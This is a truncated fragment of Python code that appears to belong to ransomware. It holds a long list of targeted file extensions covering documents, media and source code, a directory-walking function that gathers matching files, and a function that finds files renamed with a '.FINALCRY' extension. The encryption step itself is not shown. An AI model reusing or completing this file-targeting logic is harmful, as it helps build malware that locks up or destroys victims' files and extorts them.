...
RAW': 0, '.CGM': 0, '.TIF': 0, '.TIFF': 0, '.NEF': 0, '.PSD': 0, '.AI': 0, '.SVG': 0, '.DJVU': 0, '.M4U': 0, '.M3U': 0, '.MID': 0, '.WMA': 0, '.FLV': 0, '.3G2': 0, '.MKV': 0, '.3GP': 0, '.MP4': 0, '.MOV': 0, '.AVI': 0, '.ASF': 0, '.MPEG': 0, '.VOB': 0, '.MPG': 0, '.WMV': 0, '.FLA': 0, '.SWF': 0, '.WAV': 0, '.MP3': 0, '.SH': 0, '.CLASS': 0, '.JAR': 0, '.JA\ VA': 0, '.RB': 0, '.ASP': 0, '.PHP': 0, '.JSP': 0, '.BRD': 0, '.SCH': 0, '.DCH': 0, '.DIP': 0, '.PL': 0, '.VB': 0, '.VB\ S': 0, '.PS1': 0, '.BAT': 0, '.CMD': 0, '.JS': 0, '.ASM': 0, '.H': 0, '.PAS': 0, '.CPP': 0, '.C': 0, '.CS': 0, '.SUO':
    ...
    for actual_path, directories, files_found in os.walk(path):
        for arq in files_found:
            ...
            if(file_format.get(extensao) == 0 or extensao == ''):
                f.append((os.path.join(actual_path, arq)))
    return f


def find_encrypted(path):
    extension = {".FINALCRY": 0}
    f = []
    for actual_path, directories, files_found in os.walk(path):
        for arq in files_found:
            extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
            if extensao == '.FINALCRY':
                f.append((os.path.join(actual_path, arq)))
    return f
